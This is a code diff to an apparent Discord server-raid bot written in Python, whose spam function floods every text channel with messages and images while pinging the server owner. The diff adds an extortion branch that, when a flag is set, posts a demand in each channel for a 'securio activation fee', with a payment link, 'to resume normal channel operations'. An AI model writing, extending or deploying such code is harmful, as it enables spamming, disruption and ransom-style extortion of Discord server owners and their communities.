@@ -1,6 +1,6 @@
 import shelve
-
 import discord
+from discord.ext import commands
 from config import *
 
 
@@ -47,6 +47,9 @@ async def create_channels(guild):
 
 async def spam(guild):
     for channel in guild.text_channels:
+        if b_extort:
+            await channel.send(f'Pay the 1 time securio activation fee to resume normal channel operations:\n{payment_link}\n{guild.owner.mention}')
+            continue
         if b_spam_text_channels:
             await channel.send(f"{spam_message}\n{guild.owner.mention}")
         if b_spam_images:
@@ -80,9 +83,8 @@ async def replace_text_channels(guild, d):
 
 
 async def replace_voice_channels(guild, d):
-    voice_channels = [(channel, category) for (channel, category) in d['voice_channels']]
-    existing_voice_channels = [(channel.name, channel.category.name if channel.category else 'No category') for channel
-                               in guild.voice_channels]
+    voice_channels = sorted([(channel, category) for (channel, category) in d['voice_channels']])
+    existing_voice_channels = sorted([(channel.name, channel.category.name if channel.category else 'No category') for channel in guild.voice_channels])
 
     if voice_channels != existing_voice_channels:
         for channel in guild.voice_channels:
